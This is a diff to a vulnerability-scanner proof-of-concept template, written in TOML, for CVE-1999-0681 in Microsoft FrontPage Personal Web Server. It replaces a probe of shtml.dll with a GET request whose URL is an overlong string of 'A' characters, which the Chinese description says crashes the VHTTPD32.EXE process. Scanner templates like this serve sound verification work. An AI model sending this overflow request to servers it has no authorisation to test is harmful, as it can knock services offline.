@@ -1,36 +1,28 @@
 [info]
-author = "ave"
-description = "Microsoft FrontPage Personal Web Server 存在缓冲区溢出漏洞，远程攻击者通过向 _vti_bin/shtml.dll 发送超长请求可导致拒绝服务或任意代码执行。"
+author = "AVE"
+description = "Microsoft FrontPage Personal Web Server 3.0.2.926 缓冲区溢出远程拒绝服务漏洞验证。通过向目标服务器发送超过 166 字符的 GET 请求 URL，触发 VHTTPD32.EXE 进程缓冲区溢出导致服务崩溃"
 id = "POC-AVE-1999-0234"
 name = "CVE-1999-0681 PoC"
 severity = "medium"
-tags = [
-    "cve-1999-0681",
-    "frontpage",
-    "buffer-overflow",
-]
+tags = ["ave-1999-0234"]
 vuln_id = [
     "CVE-1999-0681",
     "AVE-1999-0234",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/_vti_bin/shtml.dll"
+path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    200,
-    401,
-    403,
-    500,
+part = "body"
+type = "word"
+words = [
+    "VHTTPD32",
+    "vhttpd",
 ]
-type = "status"
